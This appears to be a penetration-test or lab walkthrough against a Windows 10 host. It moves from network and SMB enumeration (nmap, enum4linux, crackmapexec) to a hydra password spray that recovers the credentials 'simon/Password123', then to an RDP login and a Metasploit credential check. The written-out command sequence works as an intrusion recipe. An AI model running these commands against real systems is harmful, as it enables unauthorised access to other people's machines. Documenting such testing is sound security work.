Phase 1 - RECONNAISSANCE

Objective: Identify live hosts and network placement.

Tools:
- ping
- netdiscover

Findings:
- Target reachable
- Same subnet (1 hop)


Phase 2 - PORT & SERVICE DISCOVERY

Objective: Identify exposed services.

Tool:
nmap -sS -sV [target]

Findings:
- 135 (MSRPC)
- 139 (NetBIOS)
- 445 (SMB)
- 3389 (RDP)


PHASE 3 - AGGRESSIVE ENUMERATION

Objective: Extract OS, host, and service metadata.

Tool:
nmap -A [target]

Findings:
- OS: Windows 10 Pro
- Hostname: SIMONPETER-PC
- SMB signing: disabled / not required
- Workgroup: WORKGROUP


PHASE 4 - SMB ENUMERATION

Objective: Test anonymous access and enumerate SMB.

Tool:
smbclient -L //[target] -N
enum4linux <target>

Result:
- Anonymous SMB access blocked
- NetBIOS information exposed
- Authentication required

Decision: Pivot to credential-based attack


PHASE 5 -VULNERABILITY IDENTIFICATION

Objective: Identify weak authentication controls

Tool:
crackmapexec smb [target]

Findings:
- SMBv1 enabled
- SMB signing disabled
- Password-based auth accepted


PHASE 6 - CREDENTIAL ACCESS

Objective: Obtain valid credentials with minimal noise.

Method: Password spray

Tool:
hydra -L users.txt -P rockyou10k.txt smb://[target]

Result:
- Valid credentials discovered
- User: simon
- Password: Password123


PHASE 7 - EXPLOITATION / ACCESS

Phase 7A - RDP Interactive Access
xfreerdp3 /u:simon /p:Password123 /v:[target] /cert:ignore

Result:
- Interactive Windows session obtained
- Existing console session terminated/transferred

Phase 7B - Metasploit Validation
use auxiliary/scanner/smb/smb_login

Result:
- Credential reuse confirmed
- Framework-level validation completed
